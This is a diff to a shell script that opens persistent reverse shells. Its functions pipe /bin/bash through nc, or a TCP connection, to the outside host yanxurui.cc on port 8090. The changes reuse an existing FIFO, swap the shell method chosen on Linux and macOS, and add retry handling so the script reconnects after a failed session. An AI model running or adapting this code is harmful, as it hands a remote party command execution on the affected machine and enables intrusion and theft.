@@ -5,8 +5,15 @@ backshell_nc()
 
 backshell_nc_pipe()
 {
-    mkfifo /tmp/tmp_fifo
-    cat /tmp/tmp_fifo | /bin/bash 2>&1 | nc yanxurui.cc 8090 > /tmp/tmp_fifo
+    pipe=/tmp/tmp_fifo
+    if [ -e $pipe ]
+    then
+        echo "$pipe exits"
+    else
+        mkfifo $pipe
+    fi
+
+    cat $pipe | /bin/bash 2>&1 | nc yanxurui.cc 8090 > $pipe
 }
 
 backshell_tcp()
@@ -20,10 +27,10 @@ backshell ()
 
     if [[ "$OSTYPE" == "linux-gnu"* ]]; then
         # Linux
-        backshell_nc
+        backshell_tcp
     elif [[ "$OSTYPE" == "darwin"* ]]; then
         # Mac OSX
-        backshell_tcp
+        backshell_nc_pipe
     elif [[ "$OSTYPE" == "cygwin" ]]; then
         # POSIX compatibility layer and Linux environment emulation for Windows
         echo "Todo"
@@ -41,11 +48,19 @@ backshell ()
         backshell_nc
     fi
 
+    retval=$?
+
     echo "session ended"
 
-    # sleep for a while in case nc fails and this loop consmes too much CPU
-    # this could happen when the client has not Internet access or the server is not running
-    sleep 3
+    if [ "$retval" == 0 ]
+    then
+        echo "exited succussfully"
+    else
+        # sleep for a while in case nc fails and this loop consmes too much CPU
+        # this could happen when the client has not Internet access or the server is not running
+        echo "exited unsuccussfully. sleeping..."
+        sleep 3
+    fi
 }
 
 loop()
